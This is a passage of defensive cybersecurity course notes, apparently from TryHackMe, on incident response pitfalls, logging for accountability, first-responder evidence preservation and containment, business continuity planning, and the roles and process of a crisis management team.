Sadly, there isn't a quick fix for this 
problem. Continuous preparation for incidents is required to upskill the
 team and help address this issue.

Insufficient Accountability

Another
 problem during incidents is inaction. It is incredibly important to 
understand that there is a difference between discussing containment, 
eradication, and recovery actions and performing them. Often during 
incidents, actions will be discussed, but no one person will be made 
responsible for actually performing the action. This then often leads to
 the incident growing as everyone thinks something has already been 
performed, when in fact, it hasn't.

Effective Incident Management
 and note-taking can help address this issue. The incident manager can 
document the actions that are taken and ensure that a responsible 
individual is nominated to not only perform the action, but provide the 
manager with feedback once the action has been taken.

# Insufficient Backups

The
 last common pitfall during incidents is insufficient backups. In the 
event that an incident results in disruptive actions such as ransomware 
being deployed, the only saving grace is backups that can be used to 
recover the estate. However, if backup processes and policies were not 
clearly established and followed, it would not be possible to recover 
from the incident.

Furthermore, sometimes backups are not 
sufficiently isolated. In modern times where the primary focus is on 
availability, often legacy backups are removed in favour of new High 
Availability Disaster Recovery environments. The issue with this however
 is that if ransomware executes on the main system, it is replicated as 
such in the DR environment. Therefore, offline and remote backups are 
just as important today.

**Conclusion**

we have learned about incident response and incident management. To summarise:

- Incidents are a part of life. Incidents will happen, and therefore we need to prepare to deal with them.
- Not all events and alerts will lead to an incident. Even when there is an
incident, we have different response levels that we can use to deal with the incident.
- Incident response focuses on answering the
question of what has happened during an incident. Incident management
focuses on effectively taking actions to close off the incident.
- There are many different roles and responsibilities during an incident. Even
if you are not part of the blue team, you may be a first responder or
may be called upon as a subject matter expert to help the blue team deal with an incident.
- Most organisations have their own incident management framework, but most are based on the NIST incident management framework that covers the four phases of
Preparation, Detection & Analyses, Containment, Eradication &
Recovery, and Post Incident Analysis.
- Several things can go wrong during an incident, and preparation can assist in reducing the impact that these pitfalls can have.

## **Logging for Accountability**

**Importance of Logging and Data Aggregation**

Logging aids any member
 involved in the incident response process. Depending on the log source,
 it may provide different benefits or visibility into a network or 
device. Some examples may include:

- Files created.
- Emails sent.
- Other TTPs (Tactics, Techniques, and Procedures) as outlined by the [MITRE ATT&CK framework](https://attack.mitre.org/).

Because logs play an important role in incident response, they 
must be authentic and, when analyzed, identical to when they were 
produced.

Adding accountability to the incident response process, 
when log sources are guaranteed to be authentic, a user can be held 
accountable for their actions, as proven by logs.

This use of accountability is more formally known as non-repudiation and contributes to many threat models, such as the [STRIDE model](https://www.microsoft.com/en-us/security/blog/2007/09/11/stride-chart/).
 Non-repudiation means that an individual cannot contest an action, the 
opposite of repudiation, where an individual disputes an action.

### Security Information and Event Management

A **S**ecurity **I**nformation and **E**vent **M**anagement system **(SIEM)** is
 a tool used to collect, index, and search data from various endpoints 
and network locations. While this room won't cover in-depth log analysis
 and SIEMs,
 it is important to create a basic level of understanding. We will 
leverage an SIEM in later tasks to get hands-on with the concepts 
presented in this room.

SIEMs
 have many features and capabilities, often for specific use cases. 
Below is a summary of the benefits and features that an SIEM can offer 
at the most basic level:

- Real-time log ingestion.
- Alerting against abnormal activities.
- 24/7 monitoring and visibility.
- Data insights and visualization.
- Ability to investigate past incidents.

Examples of SIEMs may include Wazuh, Splunk, ELK, and QRadar. For more information, check out [Auditing and Monitoring](https://tryhackme.com/room/auditingandmonitoringse).

**Log Ingestion and Storage**

While this room won't cover in-depth log analysis and SIEMs, it is important to create a basic level of understanding.

SIEMs
 are typically architected with three components used for searching, 
indexing, and load-balancing; these components are commonly known as the
 **search head**, **indexer**, and **forwarder**, respectively.

In
 this room, our objective is accountability, so we will focus primarily 
on the indexer and how data arrives from a device to the indexer; this 
process is commonly known as **data ingestion**.

- Types of data ingestion
    - Agent/forwarder
    - Port-forwarding
    - Syslog
    - Upload

While there are several ways of ingesting data, there tend to be
 fewer ways to store the data. Although the primary point of failure for
 accountability is ingestion, storage can be equally challenging.

When
 dealing with storage concerns, it is often not attackers we must worry 
about, but technical faults; for example, an index is accidentally 
deleted, or a storage device is corrupted.

These are a few 
examples of things to consider when architecting a storage solution for 
log sources. While keeping this data authentic and secure is important 
for accountability, it often has overlapping themes with compliance. 
Compliance and regulations go hand in hand; one such regulation may be 
that log data must be archived or stored for X amount of time. This 
plays into accountability again, where non-repudiation must be applied 
to a log source for compliance. For example, an audit requires the past 
six months of X log source. As a stakeholder, you must guarantee that 
those log sources reflect the activity of the network.

One 
solution to the storage problem is cold storage. Cold storage is a 
process or standard for storing data, which can be summarized as storing
 a large quantity of data optimally.

Cold storage is rarely 
accessed and thus does not require high-performance storage devices. 
Examples of cold storage may include low-cost hard drives or even tape 
drives! Conversely, hot storage is data accessed often and requires 
higher performance, which may consist of solid-state drives and, in some
 cases, high-performance hard drives. There may be other levels of 
access and performance throughout the life cycle of data that can be 
referred to as warm storage.

The standard for how long data stays
 in each phase will depend on regulatory requirements and company 
guidelines. An example of a storage process may be that data is stored 
hot for six months, warm for three months, and cold for three years. 
Depending on the data, it may be indefinitely stored in cold storage.

Payment Card Industry Data Security Standard (PCI DSS)
 is one example of a standard that requires audit logs to be stored for a
 year and kept immediately available for 90 days to remain compliant.

**Types of Logs and Data Sources**

Now that some problems are solved with how data will be sent to an indexer and SIEM solution, we must consider - what makes a good log.

While an SIEM
 provides excellent functionality, its purpose is to ingest any data and
 provide an effective and easy way to index and search it.

If
 a log does not give you the information required for an investigation, 
it cannot be used for accountability and does not uphold 
non-repudiation.

Many log sources exist to collect data 
efficiently with as much relevant information as possible. In this task,
 we will outline a few of the most common log sources and how they may 
be used in the incident response process.

- Manual log sources
    - Any log that is manually written or composed by an author
    - Change logs
- Automated log sources
    - Any logs that are automatically generated by default, for example, a configuration, tool, or from a developer
    - System logs
    - Application logs
- Other types of logs
    - Some logs may not be categorized but are often required for compliance
    - Email logs
    - Messaging or other communication

A good log source may not include only one log. Due to the 
nature of a network, it may require multiple log types to create one 
quality log source, for example, a firewall log and a system log used 
together to hold each other accountable. That is, the validity of one 
log can be proven using another and vice-versa.

A log source could also be collecting too much information; that 
is, if several types of logs are collecting the same data or creating 
the same alerts, it can increase noise, storage complexity, and other 
consequences.

**Using Logs Effectively**

There are many types of SIEMs
 to choose from, and each feature and capability can impact how you can 
use logs effectively. If you are not using a specific feature of an 
SIEM, it does not signify that you are not effectively using logs, as it
 depends on log sources and usage requirements. For example, if you are 
only using logs as an incident response tool and not for real-time 
monitoring, you may not need or use the real-time feature of some SIEMs.

As briefly introduced in task four, using multiple log types and 
sources is beneficial for validating logs and creating a complete story 
of an incident. This concept is more formally known as **correlation** or building a relationship between two things: logs and data. For example, if a user performed a suspicious action (created a DLL
 file on the disk), a browser application log could be used to correlate
 their browser search history with their behavior. If they were 
searching for a specific installer or troubleshooting process, it may 
explain the suspicious action. If email logs showed a potential phishing
 attempt directly followed by the suspicious action, it could cause more
 investigation. Data enrichment can also be included in correlation 
efforts.

## **BECOMING A FIRST RESPONDER**

**Preservation of Evidence**

Quick! You, the 
security engineer of our division, have just discovered that there is an
 incident! One of our servers has been compromised! What is the first 
thing you do? As with any CSI episode, we must preserve the crime scene.
 In this light, we need to ensure that we preserve the evidence.

# Volatility of Evidence

The
 biggest mistake that is performed during incidents is shutting the host
 down. This is wrong for the following two main reasons:

- A significant amount of important evidence is found in volatile spaces, meaning it is lost as soon as the device loses power
- It immediately alerts the threat actor that we might be on to them, meaning they might start a more disruptive attack

For
 the latter, it means that as a first step, we should not even disable 
network access on the host, as this can have the same effect. Instead, 
we want to make sure that evidence is preserved. We also want to ensure 
that we preserve evidence in order of volatility. While a digital 
forensics analyst will usually be involved in capturing most of this 
evidence, it is important to be aware of the different types of evidence
 and why we must do everything in our power to preserve it. The Internet
 Engineering Task Force (IETF) created a document called [Guidelines for Evidence Collection and Archiving](https://datatracker.ietf.org/doc/html/rfc3227#section-2.1), that provides the following volatility order with reasoning.

**1. Registers and Cache**

Registers
 and cache are extremely volatile and constantly changing as the host 
executes different applications. In a matter of split seconds, this data
 can change. While we would never be fast enough to capture this 
evidence at the exact moment of becoming aware of the incident, we 
should do it as soon as possible. This evidence can be vital for malware
 analysis to understand what the malware performed on the host. In most 
incidents, we would not capture this information, as it is simply too 
volatile.

**2. Routing Table, ARP Cache, Process Table, Kernel Statistics and Memory**

While
 the incident might have been raised on a single host, we must be aware 
that more hosts might have been infected. We also want to have a better 
understanding of not just this host in question, but also if the host 
communicated to any other hosts in the network. Therefore, we need to 
capture information such as the routing and ARP
 tables. Routes and ARP entries have a specific time-to-live, meaning if
 we are unable to capture this data in time, we might not have the full 
picture of what network communication took place at the time the 
incident occurred. These can be captured from the host itself.

Regarding
 the actual suspected host, we want to better understand what 
applications were running and what they were doing at the time of the 
incident. Therefore, we have to capture information about the processes 
that were executing at the time of the incident.

Lastly, 
just having the program name does not tell us exactly what it is or what
 it is doing. If we want to truly understand what the program is, we 
will have to collect it from memory. This means that we will need to 
capture evidence from the Random Access Memory (RAM).
 However, the information located here can be lost if there is a 
brownout or if the power is turned off. Malware has become incredibly 
advanced and can stage its different payloads, meaning even if we have a
 sample of the malware to execute in the sandbox, we cannot truly 
understand what it was doing on the host without analysing it directly 
in the memory.

**3. Temporary File Systems**

It
 is common for applications to create and use temporary files on hosts. 
For example, on a web server, active sessions are usually stored in 
temporary files. While these files are often preserved longer on the 
host, we do not want to take any chances in losing these files that may 
be important for the investigation.

**4. Disk**

The
 next step is to make sure that we take a snapshot of the host's drive. 
While this evidence portion may not be as volatile as the others, it can
 play an important part in legal proceedings and should, therefore, be 
prioritised. Preserving this evidence means that we also have the 
ability to perform the local logs on the device itself, which can help 
analysts determine if the threat actor attempted to hide their tracks by
 comparing this to remotely stored logs.

**5. Remote Logging and Monitoring**

As
 discussed in the Logging for Accountability and Monitoring room, all 
hosts should forward their logs to a secure remote location. However, 
even these remote locations do not have an infinite log retention 
policy. Since, at this stage, we are unsure how far back the incident 
goes, we want to make sure that we preserve these remote logs as far 
back as possible while the investigation is still ongoing.

**6. Physical Configuration and Network Topology**

The
 physical configuration of the host and network topology at the time of 
the incident is usually not volatile at all. However, this evidence can 
usually assist us in our investigation. Understanding and preserving 
evidence, such as which subnet the host was connected to, will be 
important when we try to understand the scope of the incident and can 
point us in the direction of other hosts that should be scrutinised and 
investigated.

**7. Archival Media**

Last
 on the list is backups. While this information will usually not be 
volatile, it can be used as evidence to help us determine how far back 
the incident went when comparing artefacts on the current disk to that 
found on backups. However, as these backups are usually not going 
anywhere, we have a bit more breathing room to focus on other, more 
volatile sources first.

# The Other Two Big DON'Ts

We
 have already talked about the first big don't, which is to not turn off
 the device; however, there are two other big don'ts according to the IETF:

- **Don't trust the programs on the system.** This means that you should not use the actual software on the host to
perform your evidence collection. The simple reason for this is that the threat actor may have altered these programs and that by using these
programs, you are tainting the evidence that you are trying to capture.
- **Don't run programs that modify the access times of files.** When a file was accessed is evidence itself. If you perform a simple
Copy + Paste, you will taint this evidence. This is why special software or hardware is used when evidence is captured to ensure that the
evidence is captured as is and not tainted.

Even if it 
happened inadvertently, it is incredibly easy to destroy or taint 
evidence, which means it cannot be used in legal proceedings moving 
forward.

# Chain of Custody

In
 order to ensure that evidence can be used in legal proceedings, chain 
of custody is also important. In order for the evidence to be admissible
 in court, we have to be able to prove that it has not been tampered 
with. Digital forensic analysts will understand the process that has to 
be followed, which will include documenting the evidence that is 
collected and updated each time the evidence is analysed. An important 
part is to prove that only a copy of the actual digital evidence is 
analysed and still matches the original captured evidence after 
investigation. This indicates that the analysis itself has not tampered 
with the evidence.

Alerting the Relevant Stakeholders

Okay, we have made sure
 not to fall into the common trap of tampering with the evidence and 
evidence collection has started. The next big step is to make sure that 
we notify the correct stakeholders. As security engineers, our main goal
 is not to deal with the incident, but to alert the team that will 
assist them further.

# Incident Playbooks

The
 blue team is usually seasoned to deal with incidents and is ready to 
act. Like a fire brigade, they should be performing many exercises and 
know the drill when an incident occurs. One way that the blue team 
prepares is through the creation of playbooks. A playbook provides steps
 and actions that were predefined to help the team deal with incidents. 
The goal of a playbook is to ensure that the process followed during an 
incident is repeatable and that no actions are forgotten. The team will 
usually have multiple playbooks to deal with various types of incidents,
 such as phishing or account compromise. These playbooks are also 
integrated with each other. For example, if credentials were compromised
 through phishing, the phishing playbook would indicate that the team 
would, at that point, also start using the account compromise playbook.

As a security engineer, you will usually not have to create a full 
incident playbook. However, you may be responsible for creating a 
playbook for your specific division that will document how and where you
 have to raise incidents.

# Call Trees

Usually,
 there are multiple ways that you can alert the team that an incident is
 occurring. In large organisations, this process is usually fully 
automated using systems such as Jira, which allows you to log and then 
escalate a ticket based on the severity of the incident. Once a ticket 
is raised, the relevant stakeholders will be notified automatically.

Another
 common approach is to make use of a call tree. Call trees indicate who 
has to be informed and who is responsible for informing them. The 
structure also shows who can be escalated to in the event that a certain
 individual is not available to perform their responsibilities. Once the
 escalation reaches the required manager, they can, at that point, 
assist by using their own call tree to further escalate the issue as 
required based on the severity of the incident.

As a security engineer, you may be responsible for creating not just 
the call tree for your division, but also help indicate when in your 
call tree you may need to escalate to the blue team.

# The Responsibility of the First Responder

As
 mentioned before, as a security engineer, you may perhaps not be 
responsible for creating playbooks or, in certain cases, even call 
trees. However, your main responsibility will be to ensure that your 
division is prepared to deal with an incident. If we continue with the 
example of a fire, while you may not be responsible for fighting the 
fire, you are responsible for knowing where the fire alarm and nearest 
exits are. Similarly, you have a responsibility to prepare your division
 for an incident by ensuring they understand where they can log an 
incident and who to contact in the event of an incident.

**Isolation of the Incident**

# The Importance of Containment

Once
 we have raised the alarm bells, the next step is containment. While 
waiting for the fire brigade to arrive, we want to ensure the damage is 
kept as small as possible. First responders will rarely perform 
containment without input from the blue team; however, knowing what 
containment is and how it can work is important. Furthermore, as a 
security engineer, the blue team might rely on you as a subject matter 
expert to help understand what containment methods are feasible to 
implement in your division.

The incident management process speaks to performing containment, eradication, and recovery. In the NIST
 Incident Management framework, these three items are grouped. However, 
it is important to understand that these items are unique and must be 
implemented in the order presented. The biggest pitfall during an 
incident is moving to eradication and recovery before the appropriate 
containment actions have been performed. If the access of the threat 
actor has not been removed or the spread of the incident has not been 
stopped, eradication and recovery would not only be ineffective, it 
would be a waste of time as the team would have to repeat the exact same
 actions. For this reason, one could argue that containment is the most 
important of the three.

# Containment Methods

As
 discussed before, the best containment method is not to switch off the 
host, as this will destroy evidence and potentially alert the threat 
actor. However, there are other means of isolation that can be 
performed:

- Network Segmentation - The host is isolated from
the network perspective by being placed into a different network
segment. This isolation aims to ensure that the infection cannot spread
to other hosts on the network. Effective [network security](https://tryhackme.com/room/intronetworksecurity) is very important!
- Physical Isolation - The host is collected and fully isolated from the network
and users. For example, a user's workstation is confiscated. This
isolation aims to ensure that no further actions can be performed on the host and evidence is preserved.
- Virtual Isolation - The host is restricted from communicating through the use of software. For example, the EDR can be used to jail the host, meaning it is only allowed to communicate with specific entities on the network and perform certain actions. The
goal of this isolation is similar to confiscating the host, but can be
performed remotely. Furthermore, in some cases, if the EDR is
compromised, this may not work.

# Sending Threat Actors Back to the Dial-Up Days

If
 containment will alert the threat actor, there is the question of 
whether isolation is the answer. Although in most cases it will be, 
there are certain cases where we might want to take a different 
approach. In certain cases, we might want to buy ourselves time to 
better investigate what the threat actor is up to.

Some say
 that slow internet is worse than no internet, but this is a valid 
technique for blue teams. Instead of performing full isolation, the team
 can decide to rate limit the network speed, which can often be done 
through the EDR.
 Doing this, the chance that the threat actor would suspect that we are 
onto them is less since everything is still working; it is just slow. 
Considering that threat actors have to use command and control channels,
 they would also be unable to pinpoint the exact problem causing the 
slow connection. Slowing down the connection will allow the team to 
perform a more in-depth analysis of the actions being performed, which 
could help the team better understand the scope of the incident to allow
 for a larger containment action when the scope is understood.

# The Responsibility of the First Responder

As
 mentioned before, as the security engineer, you may not be responsible 
for isolating the incident. However, you will be relied upon as a 
subject matter expert to help the team understand what containment 
methods may be possible and to also understand what the impact would be 
of implementing these containment methods.

Business Continuity Plan

# Invoking BCP

Now
 that we have started to contain the incident, it is time to gain some 
superpowers. If the severity of the incident is sufficient, it is time 
to invoke our Business Continuity Plan (BCP). A BCP is a plan meant to 
help recover from an incident. It is important to note that as the main 
focus is on BCP, we should not perform this before containing the 
incident.

Invoking BCP gives us some superpowers. Normally, there 
are specific processes and steps in place if we want to do something in 
our division. For example, we can't simply make changes to the 
production environment; it has to go through an entire process of 
logging the change, testing it, performing quality assurance, and 
everything else before the change can be made. However, invoking our BCP
 can allow us to bypass most of those steps. However, with great power 
comes great responsibility, which is why only select members of senior 
management might have the ability to invoke it. As discussed in the next
 task, documentation is vital when a BCP is invoked. Once invoked, the 
BCP can be followed to assist us in recovering from the incident back to
 what is called Business as Usual (BAU). BCP will not always be invoked,
 only in cases where the severity of the incident is sufficient.

# BCP vs DRP

A
 BCP is very similar to a Disaster Recovery Plan (DRP). However, the DRP
 will mainly focus on the technical recovery of our division. A BCP is 
more encompassing and covers elements such as communication to internal 
and external stakeholders. A DRP is usually included in the BCP to help 
with the technical recovery.

# Creating a BCP

As
 a security engineer, you may be responsible for creating a BCP. The 
following steps can be followed to create an effective BCP:

1. **Perform a Business Impact Analysis**  You have to plan for the worst-case scenario. By performing an
analysis, you can determine what could happen in the event of an
incident and how it would impact not only your organisation, but also
your customers. The analysis is usually performed using a combination of qualitative and quantitative measures.
2. **Define the Potential Recovery Actions** - Based on the scenarios of the first step, you can determine what
potential recovery actions would be possible. For example, in case one
of the production servers become unresponsive or has to be isolated, you could potentially switch to your disaster recovery server. Documenting
these recovery actions will allow the team to recover faster during an
actual incident.
3. **Plan the BCP Team Structure** - When the
BCP is invoked, there are certain responsibilities that have to be
fulfilled, such as documenting actions and alerting stakeholders. These
responsibilities should be planned and documented together with the
details of the individuals that would perform them.
4. **Test the BCP Plan** - In order to ensure that your BCP works as expected, you have to train your team on using it and then test it using a tabletop exercise.

# 

# BCP Metrics

As
 mentioned, the Business Impact Analysis assessment will use 
quantitative measures. These allow the team to determine how long it 
would take to implement the recovery actions of the BCP and whether 
these timelines are acceptable, below are some of the most common 
metrics used.

- **Recovery Point Objective** - The amount of data we are willing to accept can be lost. For example, if we say we
are willing to lose an hour of data but no more, then our backups have
to run every single hour.
- **Recovery Time Objective** - The amount of time required to recover the hardware of our system
- **Work Recovery Time** -The amount of time required to recover the software and data of our system
- **Maximum Tolerable Downtime** -The maximum amount of downtime that we are willing to accept. We have
to ensure that our RTO and WRT combined do not exceed this threshold
- **Mean Time Between Failures** - How long our system will operate between incidents on average
- **Mean Time To Repair** - How long it will take to recover our system on average

Documentation of Actions

# The Importance of Documentation

When
 BCP is invoked, several key steps of the process are bypassed. As 
mentioned before, BCP allows the nominated person to make changes 
without following the proper change management process. Although this 
helps the team deal with the incident faster, it means that the 
documentation for changes is no longer in place. Without this 
documentation, we would not be in a position to retrace our steps. 
Therefore, even when BCP is invoked, documentation is incredibly 
important. As a first responder, you have to make sure that you document
 any actions you or the rest of the team takes until the full handover 
to the blue team is performed.

# Documentation Templates

In
 order to assist with the documentation process, it is usually 
recommended that the BCP document also contain a documentation template 
that can be used. We do not want to waste time creating this during the 
incident, so preparing this template is important. The template should 
allow for the following information to be provided:

- Time at which the action was requested. Times should ideally be provided in a standard format such as UTC to ensure that times can be matched to other sources
- Description of the update or action that was performed
- Reasoning for performing the action
- Individual approving the action being performed
- Individual responsible for performing the action
- Time at which the action was performed
- Description of changes observed after the action was performed

As you will see from above, we do not only document when the action 
was requested and by who, but also when the action was performed and who
 is taking responsibility for performing it. The reason for this is that
 it is common for actions to be discussed but never implemented, as the 
individual responsible for implementing the action was never confirmed. 
This can often lead to the scope of an incident increasing since the 
team believes that actions are being performed while critical time is 
lost.

# Lessons Learned

Documentation
 is not only important to perform a successful handover, but also 
provides us with the ability to review the incident and actions taken at
 a later date. It is through this review process that we can investigate
 what went wrong and what can be done to ensure that it is prevented in 
the future. This process helps us reduce the number of incidents that we
 have.

## **CYBER AND CRISIS MANAGEMENT**

What is a Cyber Crisis

# What is a Cyber Crisis?

In the Intro to Incident Response and Management [room](https://tryhackme.com/room/introtoirandim),
 we discussed what constitutes a cyber incident. The SOC receives log 
information that creates events and alerts. In the case that an alert is
 sufficiently serious, a cyber incident occurs.

However, based on 
the severity of the incident, the blue team decides the best response. 
In our example, only a level 4 incident would trigger the **Crisis Management Team (CMT)**. As a refresher, these were the four levels:

- **Level 1: SOC Incident** - Small enough that the incident can be taken care of directly by the
security operations centre (SOC), such as a user reporting a phishing
email
- **Level 2: CERT Incident** - Small enough that a team
in the SOC can take care of the incident, such as a single user that has interacted with a phishing email
- **Level 3: CSIRT Incident** - A larger incident that requires not just the SOC team, but also
incident managers, such as multiple users that have interacted with a
phishing email that contains malware
- **Level 4: CMT Incident** - A critical incident where the CSIRT requires the ability to invoke
nuclear actions, such as an incident where ransomware is being deployed
and the CSIRT needs to take the environment offline to protect the rest
of the estate

So, how does the team actually decide the
 level of an incident? This is done through an incident severity 
classification matrix as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d54b1bd910019fc66fba7413c5b510d7.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d54b1bd910019fc66fba7413c5b510d7.svg)

While
 this is an example, most incident severity classification methods rely 
on measuring the scope of the incident against the number of systems or 
users that are impacted vs the difficulty of recovering the affected 
systems and assets. Therefore, if many users are affected on a critical 
system, this would usually result in the incident being rated critical, 
resulting in the CMT getting involved. Some organisations also add 
certain special rules to their severity matrix. For example, if any 
amount of customers are affected, the incident severity is rated as 
critical.

**The Roles and Responsibilities in a CMT**

# Not all Voices are Equal

There
 are several roles and responsibilities that have to be taken care of in
 the CMT. Normally, not all CMT members are involved from the start. 
Depending on the crisis, members are added as needed. This is to help 
ensure that the CMT can respond as rapidly as possible.

While in 
most cases a democracy is the best solution to ensure that everyone's 
voices are heard, the opposite is true for CMT. An autocracy is the best
 approach for a CMT to ensure that actions are taken decisively without 
wasting precious time. Usually, this responsibility would fall on the 
CEO. This is a fairly extreme approach and to share the responsibility 
of making these decisions, some CMTs will provide voting rights to key 
individuals, usually no more than five. So while it is still a small 
team that can request that actions are taken, the responsibility no 
longer lies on just one individual.

# Roles in the CMT

The table below details some of the roles and responsibilities you can find in a typical CMT:

| **Role/Responsibility** | **Description** |
| --- | --- |
| CMT Chair | The
 Chair is the person that leads the CMT. Usually, this role is fulfilled
 by either the CEO or the COO of an organisation. The Chair is 
responsible for leading the CMT and, as mentioned before, is usually 
responsible for having the final say in what actions will be implemented
 during the cyber crisis. |
| Executives | Executives
 are usually part of the CMT. This includes the CEO, COO, CIO, CTO, CFO,
 and even the CISO. In cases where not just the CEO is responsible for 
decision-making, these executives would each be granted a voting right. 
As executives will ultimately be held accountable for what happened 
during the incident, they are involved in the CMT to ensure that the 
damage is kept as small as possible. |
| Communication | An
 important responsibility in the CMT is communication. This includes 
communications that are being sent both internally to employees and 
externally to customers. An important part of any CMT is staying in 
control of the narrative to help ensure that unnecessary panic is not 
created. Therefore, communication during the cyber crisis is incredibly 
vital. |
| Legal | While we would like to 
believe that the CMT can take any action, it is important to ensure that
 these actions are actually legal. A very common discussion during 
certain cyber crisis scenarios is whether a ransom will be paid or 
whether the team will interact with the threat actors. It is important 
to note that in certain countries, these actions may not even be legal 
for the team to do. |
| Operations | One of 
the CMT member's sole responsibility is to concern themselves with the 
best possible approach to ensure that the operations of the organisation
 are affected the least amount possible during the cyber crisis. In 
certain cases, this role is fulfilled by the COO; however, it can also 
be fulfilled by an entire team of experts that are looking for ways that
 business can continue during the crisis. |
| Subject Matter Experts | Most
 of the members of the CMT are not technical. These are members that are
 exceptional at business concerns but do not usually concern themselves 
with the day-to-day complexities of actually running the organisation's 
systems. During a cyber crisis, subject matter experts (SMEs) play a 
vital role in providing critical information to the members of the CMT. 
This information then helps inform the team about the crisis scope and 
which actions would be the best to perform. During a cyber crisis, this 
would most likely include the head of the SOC and/or the incident 
manager of the CSIRT. |
| Scribe | Note-taking
 is incredibly important during a cyber crisis. It is important to 
create a full timeline of events as this often has to be disclosed to 
other third parties, such as the government or regulator. The role of 
the scribe is therefore important to detail all events and conversations
 during the CMT session. |

**The Golden Hour**

When the CMT is 
invoked, the first hour is one of the most crucial. Similar to any 
investigation, as more time progresses, rebuilding what has happened and
 recovering from it becomes harder. We refer to this as the Golden Hour.
 During the Golden Hour, the CMT has to perform several critical steps.

# Assembly

The
 first step in the Golden Hour is to assemble the CMT. Once the CSIRT 
decides to invoke CMT, a process should be followed to notify all 
initial CMT members that they are required to help with a cyber crisis. 
Usually, a playbook and call tree are created for this. It is incredibly
 important since some of the required members may not be available (for 
example, the COO could be stuck on an overnight flight). Therefore, 
their replacement and their replacement's replacement should already be 
documented.

Usually, the CSIRT Chair would be responsible for 
invoking the CMT and then performing the initial notification. From 
there, several members can assist in assembling the CMT. The team should
 also decide if the team would assemble remotely or in person and what 
communication channels will be used. While this decision might sound 
simple, it is often harder than you would think. It could be that the 
CSIRT has a strong suspicion that their primary communication channels 
have been compromised by the threat actor and therefore, out-of-band 
communication will be required.

# Information Gathering

Once
 the CMT has been established, the very first step is to understand what
 has happened and what actions should be taken immediately. For a cyber 
crisis, this is usually done in the form of a CSIRT briefing where the 
CSIRT provides:

- A summary of the information discovered up to this point
- A summary of the actions that have already been taken by the team and the effect they had on the incident
- Recommendations as to what nuclear actions should be taken immediately by the CMT

# Crisis Triage

Once
 the CMT has been briefed, it is important for the team to triage the 
incident and consider the actions proposed by the CSIRT. The CMT should 
think carefully about the impact that the actions would have on the 
organisation and already think about what steps can be taken to limit 
the impact. During this triage phase, the team will also decide on which
 other stakeholders should be involved in the CMT.

# Notifications

As
 mentioned before, controlling the narrative is incredibly important. As
 such, one of the first steps that the CMT should already perform during
 the Golden Hour is to prepare and in certain cases send out 
communication, both internally and externally. Usually, CMTs would 
prepare by making use of holding statements. These are messages that do 
not divulge exactly what is happening, but provide reassurance that the 
team is investigating and will provide more feedback as information 
becomes available. This can help calm the situation as stakeholders are 
aware that the team is busy working on whatever the issue is.

**The CMT Process**

Once the CMT has been 
established and the Golden Hour actions have been performed, the CMT 
starts with a cyclic process to deal with the crisis, as shown below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/71572f39d5d25f6a66d26a11cdcd2192.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/71572f39d5d25f6a66d26a11cdcd2192.svg)

It
 is important to note that during the entire process, the CMT remains 
static. Rather than have members of the main CMT split off and find 
information, SMEs are used to bring information to the CMT. This is 
because if the CMT team were to split off during a critical moment, it 
would waste time to assemble the team again. This model ensures that the
 CMT can always receive critical information from stakeholders and SMEs.

# Information Updates

The
 CMT receives updates from the various stakeholders. This usually 
happens in the form of briefings with SMEs. The goal is to provide the 
CMT with new information to better understand the scope of the crisis 
and what impact actions taken in the past have had on the crisis. The 
CMT decides how often these update sessions are performed. At the start 
of the crisis, these updates would often be more frequent.

As 
mentioned before, the CMT usually consists of members that are not as 
technical. It is, therefore, important that SMEs provide the update 
information in a manner that can be understood by the CMT. Usually, 
technical information is abstracted in the update and the focus is more 
on the impact of what has happened than what has actually happened.

# Triage

Once
 the team receives new information, the triage process has to occur 
again. During this phase, the CMT decides if the severity of the crises 
should be raised or lowered and if any new SMEs should be involved in 
the CMT. The CMT also needs to decide if there will be any new 
communication sent out internally and externally.

# Action Discussions

Using
 the new information provided by the various SMEs, the CMT has to 
discuss the proposed actions. The goal of these discussions is to 
understand the impact that these actions would have on the organisation.
 In this case, we are no longer talking about easy and small actions, 
such as removing a phishing mail from a user's mailbox. We are talking 
about large actions such as:

- Restricting remote access to the environment by halting all VPN access
- Performing a domain takeback of the Active Directory domain
- Switching a system over to the disaster recovery environment

These
 are actions that the CMT can't take lightly, as they would impact the 
business. The goal of discussions is to better understand that impact 
and allow the team to determine if there may be any less impactful, but 
still effective actions that can be taken.

# Action Approvals

The
 CMT chair will usually limit the amount of time for discussions. This 
is to ensure that the discussions do not go on forever, leading to 
inaction. Furthermore, depending on the scenario, the situation may 
worsen with more time. For example, if ransomware is being deployed from
 a central location such as Group Policy Objects, the entire Windows 
environment would be encrypted within 120 minutes! Every single minute 
the team discusses actions longer, the ransomware is spreading. 
Therefore, these discussions are limited before the team decides which 
actions will be followed.

As discussed before, this is usually not
 done in a very democratic way and will often be a decision made 
directly by the CEO. These decisions are not made lightly, as the 
executives will ultimately be held accountable for the crisis; however 
inaction can often be much more detrimental. Would you be able to make 
these critical decisions, choosing between the lesser of two evils in a 
limited amount of time?

# Documentation and Crisis Closure

Once
 the crisis has been remedied, it has to be documented. Using the notes 
from the scribe, a crisis document is created. This document details 
what happened during the crisis and what actions were implemented to 
deal with the crisis. This information is not just for the archive, but 
can be used by the CMT to learn lessons about the crisis and adapt their
 processes and policies to better deal with a cyber crisis in the 
future.

**The Importance of SMEs**

# Jack of All Trades

The
 members of the CMT usually have broad scopes for their roles. For 
example, the CEO is responsible for running the entire organisation. 
While the CEO might have extensive knowledge of several things in the 
organisation, it cannot be expected that they are an expert in 
everything that the organisation does. This is the case for most of the 
CMT members. As such, this team in isolation would not be able to deal 
with the crisis and therefore, have to leverage the expertise of others 
around them.

# The Masters of One

This
 is where subject matter experts come into play. As a security engineer,
 you may be involved in a CMT if the crisis pertains to your specific 
division. As the security engineer, you should have an incredible depth 
of knowledge of your specific system or asset and can therefore provide 
vital information to the CMT.

The CMT can only take effective actions if the following is true:

- The CMT must have an accurate understanding of the scope of the incident,
including what has happened and what the impact is on the business. It
will never be possible to understand the full crisis scope as the
investigation will still be ongoing, but having an as clear as possible
picture is important.
- The CMT has to understand what actions are available for them to take and what the impact vs effectiveness of
these actions would be.

SMEs play a critical role in 
providing this information. As a security engineer, you will understand 
the system best to know what potential actions can be taken to recover 
from the crisis. You will know how long backups are kept. You will know 
